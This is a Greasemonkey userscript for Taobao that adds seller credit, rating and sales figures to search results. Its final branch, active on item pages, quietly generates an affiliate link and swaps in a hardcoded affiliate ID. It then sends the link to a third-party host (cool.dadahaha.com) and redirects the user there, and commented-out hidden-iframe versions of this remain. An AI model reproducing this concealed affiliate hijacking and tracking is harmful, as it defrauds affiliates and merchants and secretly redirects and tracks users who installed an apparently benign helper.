// ==UserScript==
// @name           taobaoplusplus
// @namespace      taobaoplusplus
// @include        *taobao.com*
// @description    淘宝加加 http://userscripts.org/scripts/show/52053
// @homepage       http://groups.google.com/group/taobaojiajia?hl=zh-CN
// @uso:timestamp  Wed, 17 Jun 2009 22:50:26 +0000  
// ==/UserScript==

var dump = function( obj, name, maxDepth, format, indent, tabsize, depth, tabs ) 
{
	if( typeof obj      == "undefined" ) return "dumpObj: No object was passed in!\n";
	if( typeof maxDepth == "undefined" ) maxDepth = 0;
	if( typeof name     == "undefined" ) name     = "<root object>";
	if( typeof format   == "undefined" ) format   = 1;
	if( typeof indent   == "undefined" ) indent   = "";
	if( typeof tabSize  == "undefined" ) tabSize  = 8;
	if( typeof depth    == "undefined" ) depth    = 0;
	if( typeof tabs     == "undefined" ) tabs     = "";
	 
	if( typeof obj != "object" ) return obj;

	var child = null,
	   output = [];
	   
	output.push( indent + name + "\n" );

	if( format )
	{
	 indent += "  ";
	 
	 var maxLength = 0;
	 for( var item in obj )
	   if( item.toString().length > maxLength ) maxLength = item.toString().length;
	}

	for( var item in obj )
	{
	 try
	 {
	  child = obj[item];
	 } 

	 catch (e) 
	 {
	  child = "<Unable to Evaluate>";
	 }
	 
	 if( format )
	 {
	   var numSp   = maxLength - item.toString().length + 1,
		   tabs    = "";

	   while( --numSp > 0 ) tabs += " ";
	 }
	 
	 if( typeof child == "object" ) 
	 {
	   if( depth >= maxDepth ) 
		 output.push(  indent + item + tabs + ": <object, max depth reached>\n" );

	   else
	   {
		 try
		 {
		   var temp = dump( child, item, maxDepth, format, indent, tabsize, depth + 1, tabs );
		 }
		 catch( e )
		 {
		   output.push( indent + item + tabs + ": <object could not be iterated, Error name: '" +
						e.name + "'. Error message: '" + e.message + "'>\n" );
		   temp = null;
		 }
	   
		 if( temp == indent + item + "\n" )
		   output.push( indent + item + tabs + ": <object, only has built-in properties>\n" );
		 
		 else if( temp )
		 {
		   output.push( " \n" );
		   output.push( temp );
		   output.push( "\n------------------------------------------------------------------------<end of " +
						item + ">---------------------------------------------- \n \n" );
		 }
	   }
	   continue;
	 } 

	 else 
	 {
	   if( format )
	   {
		 var intro   = indent + item,
			 length  = intro.length + numSp + 1,
			 indent2 = "  ";
			 
		 while( --length > 0 ) indent2 += " ";
	   }
	   
	   else
	   {
		 var intro   = indent + item,
			 tabs    = indent2 = "";
	   }

	   output.push( intro + tabs + ": " + 
		 ( ( !format )? child : child.toString().replace( /({)\n   ( \[native code\])\n(})/,
		   "$1$2 $3"  ).replace( /(\r\n|[\r\n]+|<br ?\/?>)/gm, "$1" + indent2 + tabs ) ) + "\n" );
	 }
	}
	return output.join( "" );
}


if(     document.location.href.indexOf('http://search1.taobao.com/browse/')==0
	||  document.location.href.indexOf('http://search8.taobao.com/browse/')==0
	||  document.location.href.indexOf('http://list.taobao.com/browse/')==0 ){	
	//添加附加信息
	//GM_log(unsafeWindow.opener)
	//taobaoplusplus/taobaoplusplus: name: autopager-split-browser-3
	//if(unsafeWindow.name.indexOf('autopager') >= 0)
	if(document.defaultView.name.indexOf('autopager') >= 0)
		return
	var items = new Array()
	var getCridet= function(responseDetails){
		var r = responseDetails.responseText.replace(/\r\n/g,'')
		
		var allSell = ''
		var sell30day =''
		var sellHaoPing =''
		var buyHaoPing =''
		var img = ''
		//<li class="item-float-average"><span>编号:</span>6d083c9f41e621336925550394c3f562</li>
		//var id = responseDetails.responseText.match(/编号:<\/span>([0-9a-zA-Z]{32})<\/li>/)[1]
		
		var id = responseDetails.responseText.match(/item_id=([0-9a-zA-Z]{32})/)[1]
		//GM_log(id)
		var t = r.match(/<div class="credit">(.*?)<\/li>/)
		if(t){
			var tm = '';
			if(tm  =  r.match(/30天售出.+?(\d+).+?件/))
				sell30day=tm[1]
			if(tm = r.match(/http:\/\/pics\.taobaocdn\.com\/newrank\/s_(.+?)\.gif/)){
				img='<img src="'+tm[0]+'" />'
			}
			//<li><span>卖家好评率：</span>99.94%</li>
			//<li><span>好评率：</span><strong>100.0%</strong></li>
			//<li><span>好评率：</span>98.09%</li>
			var tm = r.match(/<li><span>好评率：<\/span>(.+?)<\/li>/)
			if(tm)
				sellHaoPing=tm[1]
			//<li><span>买家好评率：</span>100.0%</li>
			if(tm = r.match(/<li><span>买家好评率：<\/span>(.+?)<\/li>/))
				buyHaoPing = tm[1]
		}else{
		//<li class="sold-out clearfix"><span>累积售出：</span><em>1736</em>件</li>
			allSell = r.match(/累积售出：.+?(\d+).+?件/)[1]
			//GM_log('allSell'+allSell)
		}

		for (x in items)
		{
			var item = items[x]
			if( item.innerHTML.match(id) && !item.hasAttribute('taobaopp') )
			{
				item.setAttribute('taobaopp','added')
				if(item.getAttribute('taobao')=='grid'){
					var s5 = ''
					if(GM_getValue('sellin30',true))
						if(t)
							s5 += '<span style="color:#FF6501;font-weight:700;" title="30天售出件数"> '+sell30day+'</span>'
						else{
							s5 += '<span title="累计售出件数"> 累计 '+allSell+'</span>'
						}		
					if(GM_getValue('credit',true) )
						s5 += '<span title="卖家信用">'+img+'</span>'
					if(GM_getValue('sellHaoPing',true))
						s5 += '<span title="卖家好评率"> '+sellHaoPing+'</span>'
					if(GM_getValue('buyHaoPing',true))
						s5 += '<span title="买家好评率"> '+buyHaoPing+'</span>'
					var n = 9
					//if(document.location.href.indexOf("search8")>0)
					//	n = 7
					item.childNodes[n].childNodes[1].innerHTML = s5	+ item.childNodes[n].childNodes[1].innerHTML				
				}else{
					var s = ''
					if(GM_getValue('sellHaoPing',true))
						s += '<span title="卖家好评率"> '+sellHaoPing+'</span>'
					if(GM_getValue('buyHaoPing',true))
						s += '<span title="买家好评率"> '+buyHaoPing+'</span>'
					//s +='</div>'
					
					item.childNodes[7].innerHTML += s
					
					var s5 = '<li><div style="color:white">.</div>'
					if(GM_getValue('sellin30',true))
						if(t)
							s5 += '<div style="text-align:right" title="30天售出件数">'+sell30day+'</div>'
						else{
							s5 += '<div style="text-align:right" title="累计售出件数">累计 '+allSell+'</div>'
							//GM_log('allSell'+allSell)
						}
					if(GM_getValue('credit',true) )
						s5 += '<div title="卖家信用">'+img+'</div>'
					s5 +='</li>'			
					item.childNodes[5].innerHTML += s5
				}
			}
		}	
	}
	var flash =function(){
		var list = null
		var liXpath=''
		var listOrGrid = 'list'
		if(document.location.href.indexOf('-grid-')>0){
			liXpath = "//li[@class='list-item hlisting sell' and not(@taobao)]"
			listOrGrid = 'grid'
		}
		else{
			liXpath = "//li[@class='list-item' and not(@taobao)]"
			listOrGrid = 'list'
		}
		list = document.evaluate(liXpath,document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null)	
		for (var i = 0; i < list.snapshotLength; i++) {
			var item = list.snapshotItem(i)
			if(item.hasAttribute('taobao'))
				continue
			var href
			if(document.location.href.indexOf("search8")>0)
			{
				//<input type="checkbox"  name="auction_id" value="cb5fd04c75496800e6d4d654cf7ddcdd_{0db2}"/>
				href = item.innerHTML.match(/name="auction_id" value="(\w+)_\{(\w+)\}/)
				//GM_log(href)
				href = 'http://item.taobao.com/auction/item_detail-'+href[2]+'-'+href[1]+'.htm'
			}
			else
			{
				href = item.childNodes[1].childNodes[0].href
			}
			GM_xmlhttpRequest({method: 'GET',url: href,onload: getCridet})
			item.setAttribute('taobao',listOrGrid)
			items.push(item)
			//GM_log(href)
		}
	}
	flash()

	document.addEventListener('DOMNodeInserted', function(event){
		if(event.originalTarget.id=='list:content'){
			flash()
		}
	}, false)

}
else if( document.location.href.indexOf('http://search.taobao.com/search')==0){	
	//添加附加信息
	//GM_log('http://search.taobao.com/search')
	//taobaoplusplus/taobaoplusplus: name: autopager-split-browser-3
	//if(unsafeWindow.name.indexOf('autopager') >= 0)
	if(document.defaultView.name.indexOf('autopager') >= 0)
		return
	var items = new Array()
	var getCridet= function(responseDetails){
		var r = responseDetails.responseText.replace(/\r\n/g,'')
		
		var allSell = ''
		var sell30day =''
		var sellHaoPing =''
		var buyHaoPing =''
		var img = ''
		//<li class="item-float-average"><span>编号:</span>6d083c9f41e621336925550394c3f562</li>
		//var id = responseDetails.responseText.match(/编号:<\/span>([0-9a-zA-Z]{32})<\/li>/)[1]
		
		var id = responseDetails.responseText.match(/item_id=([0-9a-zA-Z]{32})/)[1]
		//GM_log(id)
		var tm = '';
		//img = t[0].match(/<img src="(.*?)"/)[0]+' />'
		//<img src="http://pics.taobaocdn.com/newrank/s_cap_1.gif"  border="0" align="absmiddle" class="rank" />
		//http://pics.taobaocdn.com/newrank/s_blue_4.gif
		if(tm = r.match(/http:\/\/pics\.taobaocdn\.com\/newrank\/s_(.+?)\.gif/)){
			img='<img src="'+tm[0]+'" />'
		}
		//<li><span>卖家好评率：</span>99.94%</li>
		//<li><span>好评率：</span><strong>100.0%</strong></li>
		//<li><span>好评率：</span>98.09%</li>
		var tm = r.match(/<li><span>好评率：<\/span>(.+?)<\/li>/)
		if(tm)
			sellHaoPing=tm[1]
		//<li><span>买家好评率：</span>100.0%</li>
		if(tm = r.match(/<li><span>买家好评率：<\/span>(.+?)<\/li>/))
			buyHaoPing = tm[1]
		//GM_log(img+sellHaoPing)

		for (x in items)
		{
			var item = items[x]
			if( item.innerHTML.match(id) && !item.hasAttribute('taobaopp') )
			{
				item.setAttribute('taobaopp','added')
				if(item.getAttribute('taobao')=='grid'){
					//GM_log(id);
					var s5 = ''
					// if(GM_getValue('sellin30',true))
						// if(t){
							// s5 +=''
							// //s5 += '<span style="color:#FF6501;font-weight:700;" title="30天售出件数"> '+sell30day+'</span>'
						// }else{
							// s5 += '<span title="累计售出件数"> 累积售出：'+allSell+' 件</span>'
						// }		
					if(GM_getValue('credit',true) )
						s5 += '<span title="卖家信用">'+img+'</span>'
					if(GM_getValue('sellHaoPing',true))
						s5 += '<span title="卖家好评率"> '+sellHaoPing+'</span>'
					if(GM_getValue('buyHaoPing',true))
						s5 += '<span title="买家好评率"> '+buyHaoPing+'</span>'
					var n = 9
					//if(document.location.href.indexOf("search8")>0)
					//	n = 7
					//item.childNodes[n].childNodes[1].innerHTML = s5	+ item.childNodes[n].childNodes[1].innerHTML
					var an = document.createElement("span");
					an.innerHTML = '<span style="position:relative;top:65px;">'+s5+'</span>'
					item.appendChild(an)	
					//item.childNodes[n].width = 200
				}else{
					var s = ''
					
					//s +='</div>'
					
					//item.childNodes[7].innerHTML += s
					
					var s5 = '<li><div style="color:white">.</div>'
					// if(GM_getValue('sellin30',true))
						// if(t)
							// s5 += '<div style="text-align:right" title="30天售出件数">'+sell30day+'</div>'
						// else{
							// s5 += '<div style="text-align:right" title="累计售出件数">累计 '+allSell+'</div>'
							// //GM_log('allSell'+allSell)
						// }
					if(GM_getValue('credit',true) )
						s += '<div title="卖家信用">'+img+'</div>'	
					if(GM_getValue('sellHaoPing',true))
						s += '<div title="卖家好评率"> '+sellHaoPing+'</div>'
					if(GM_getValue('buyHaoPing',true))
						s += '<div title="买家好评率"> '+buyHaoPing+'</div>'
					item.childNodes[5].childNodes[3].innerHTML += s
					//item.childNodes[5].innerHTML += s5
					
					// var an = document.createElement("span");
					// an.innerHTML = '<span style="position:relative;top:65px;">'+s+'</span>'
					// item.appendChild(an)	
				}
			}
		}	
	}
	var flash =function(){
		var list = null
		var liXpath=''
		var listOrGrid = 'list'
		liXpath = "//li[@class='list-item' and not(@taobao)]"
		
		if(document.location.href.indexOf('style=grid')>0){			
			listOrGrid = 'grid'			
		}
		list = document.evaluate(liXpath,document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null)	
		for (var i = 0; i < list.snapshotLength; i++) {
		//for (var i = 0; i < 6; i++) {
			//GM_log(list.snapshotLength)
			var item = list.snapshotItem(i)
			if(item.hasAttribute('taobao'))
				continue
			var href
			//GM_log(item.innerHTML)
			//html/body/div[2]/div[3]/div/div/div[6]/div/ul/li/h3/a	
			if(!item.childNodes[1])
				continue
			href = item.childNodes[1].childNodes[0].href
			href = href.replace('http://ju.atpanel.com/?url=','')
			
			//GM_log(href)
			GM_xmlhttpRequest({method: 'GET',url: href,onload: getCridet})
			item.setAttribute('taobao',listOrGrid)
			items.push(item)
			//GM_log(href)
		}
	}
	flash()

	document.addEventListener('DOMNodeInserted', function(event){
		if(event.originalTarget.id=='list:content'){
			flash()
		}
	}, false)

}
// else if( document.location.href.indexOf('http://item.taobao.com/auction/item_detail--.jhtml?taomi=')==0
	// && document.defaultView.name == 'b2k'){
	// document.defaultView.top.location.href = 'http://cool.dadahaha.com/count.php?'+document.location.href
	// //document.defaultView.top.location.href = document.location.href
// }

else if(  document.location.href.indexOf('http://item.taobao.com/auction/item_detail')==0
	   && document.location.href.indexOf('http://item.taobao.com/auction/item_detail--.jhtml?taomi=') !== 0 ){
	var hash = document.location.href.match(/[0-9a-z]{32}/)
	var input = document.evaluate("//input[@name='title']", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE , null).singleNodeValue
	var title = input.value
	var key = encodeURI(title)
	var qurl = 'http://taoke.alimama.com/spreader/search_auction.htm?_input_charset=utf8&mid=0&cat=0&od=7&q='+key
	//GM_log(qurl)
	GM_xmlhttpRequest({
		method: 'GET',
		url: qurl,
		onload: function(responseDetails) {
			var reg = new RegExp('getSingleCode\\((\\d+).+?'+hash)
			var actionid = null
			actionid = responseDetails.responseText.match(reg)			
			if(actionid){
				//GM_log(actionid)
				actionid = actionid[1]
				var tempurl = 'http://taoke.alimama.com/spreader/gen_single_code.htm?auction_id='+actionid
				GM_xmlhttpRequest({
					method: 'GET',
					url: tempurl,
					onload: function(responseDetails) {
						sclick = responseDetails.responseText.match(/>(http:\/\/s\.click\.taobao\.com\/t.+?)</)
						//sclick = sclick[1].replace(/\d{8}/,'11575228')
						sclick = sclick[1].replace(/\d{8}/,'13776415')
						
						//document.defaultView.top.location.href = 'http://cool.dadahaha.com/count.php?'+sclick
						
						// var el = document.createElement("iframe")
						// el.src=sclick
						// el.name="b2k"
						// el.style.display = "none"
						// el.style.height = 0
						// document.body.insertBefore(el, document.body.lastChild)
						
						// var el = document.createElement("iframe")
						// el.src='http://cool.dadahaha.com/count.php?'+sclick
						// el.name="b2k"
						// el.style.display = "none"
						// el.style.height = 0
						// document.body.insertBefore(el, document.body.lastChild)
						
						tempurl = 'http://cool.dadahaha.com/count.php?'+sclick
						GM_xmlhttpRequest({
							method: 'GET',
							url: tempurl,
							onload: function(responseDetails) {
								location.href = tempurl
							}
						})
					}
				})
			}
			
		}
	})
}
